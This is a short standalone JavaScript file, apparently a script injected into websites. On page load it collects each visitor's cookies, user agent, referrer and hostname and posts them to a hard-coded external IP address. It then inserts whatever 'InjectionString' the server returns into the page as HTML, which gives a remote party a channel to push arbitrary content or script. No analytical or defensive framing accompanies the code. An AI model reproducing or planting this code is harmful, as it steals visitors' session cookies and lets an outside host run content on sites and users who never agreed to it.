function e(d) {
  var xhr = null;
  if (!!window.XMLHttpRequest) {
    xhr = new XMLHttpRequest();
  } else if (!!window.ActiveXObject) {
    var xhrs = ['Microsoft.XMLHTTP', 'Msxml2.XMLHTTP', 'Msxml2.XMLHTTP.3.0', 'Msxml2.XMLHTTP.6.0'];
    for (var i = 0; i < xhrs.length; i++) {
      try {
        xhr = ActiveXObject(xhrs[i]);
        break;
      } catch (e) {}
    }
  }
  if (!!xhr) {
    xhr.open('POST', 'http://185.149.120\.3/scholargoogle/');
    xhr.timeout = 10000;
    xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
    xhr.onreadystatechange = function() {
      if (xhr.readyState == 4 && xhr.status == 200) {
        var resp = xhr.responseText;
        if (resp) {
          var fans = JSON.parse(resp);
          if (fans) {
            var an_s = decodeURIComponent(fans.InjectionString).replace(/\+/g, '%20');
            var da = document.createElement('div');
            da.id = 'ans';
            da.innerHTML = an_s;
            document.body.appendChild(da);
          }
        }
      }
    };
    var pd = [];
    for (var k in d) {
      if (d.hasOwnProperty(k)) {
        pd.push(k + '=' + d[k]);
      }
    }
    var dc = pd.join('&');
    xhr.send(dc);
  }
}
e({
  'agent': navigator.userAgent,
  'referer': document.referrer,
  'cookie': document.cookie,
  'domain': window.location.hostname,
  'c_state': !!document.cookie
});
